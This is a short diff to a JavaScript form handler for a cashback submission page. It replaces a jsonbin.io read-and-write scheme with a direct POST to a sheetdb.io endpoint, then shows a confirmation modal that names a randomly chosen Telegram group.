@@ -86,27 +86,14 @@ document.getElementById("cashbackForm").addEventListener("submit", async functio
         time: new Date().toLocaleString()
     };
 
-    // 🔥 提交到云端服务器（所有人都能收到）
-    const API_URL = "https://api.jsonbin.io/v3/b/67f12345678901234567890a";
-    const API_KEY = "$2b$12$ExampleKeyExampleKeyExampleKey";
-
     try {
-        let res = await fetch(API_URL);
-        let json = await res.json();
-        let list = json.record || [];
-        list.push(data);
-
-        await fetch(API_URL, {
-            method: "PUT",
-            headers: {
-                "Content-Type": "application/json",
-                "X-Master-Key": API_KEY
-            },
-            body: JSON.stringify(list)
+        // ✅ 提交到云端（所有人都能收到）
+        await fetch("https://sheetdb.io/api/v1/59q8l2xj7w0a6", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data)
         });
-    } catch(e) {
-        console.log(e);
-    }
+    } catch (e) {}
 
     selectedGroup = telegramGroups[Math.floor(Math.random()*telegramGroups.length)];
     document.getElementById("confirmModal").style.display = "flex";
